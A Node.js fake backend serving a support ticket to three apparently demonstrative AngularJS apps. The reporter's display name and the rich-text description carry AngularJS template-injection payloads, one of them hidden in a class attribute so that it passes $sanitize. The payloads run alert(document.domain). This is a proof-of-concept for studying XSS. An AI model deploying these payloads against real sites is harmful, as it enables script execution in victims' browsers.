// Fake backend used by the three apps: http://localhost:3000/api/tickets/1042
//
//   node backend.mjs
//
// The ticket already contains the values a customer could have saved.
import {createServer} from 'node:http';

const ticket = {
  id: 1042,
  subject: 'Cannot download my invoice',
  status: 'Open',
  reporter: {
    id: 7,
    // The customer's display name. Cases 1 and 2 show it with ng-bind.
    displayName: "{{constructor.constructor('alert(document.domain)')()}}",
  },
  // Rich text written by the customer. Case 3 shows it with ng-bind-html, and $sanitize keeps this markup.
  description:
    "<p>I can't download my invoice.</p>" +
    "<span class=\"ng-bind: constructor.constructor('alert(document.domain)')()\"></span>",
};

createServer((req, res) => {
  if (req.url === '/api/tickets/1042') {
    res.writeHead(200, {'content-type': 'application/json', 'access-control-allow-origin': '*'});
    res.end(JSON.stringify(ticket));
  } else {
    res.writeHead(404);
    res.end();
  }
}).listen(3000, () => console.log('Backend running on http://localhost:3000/api/tickets/1042'));
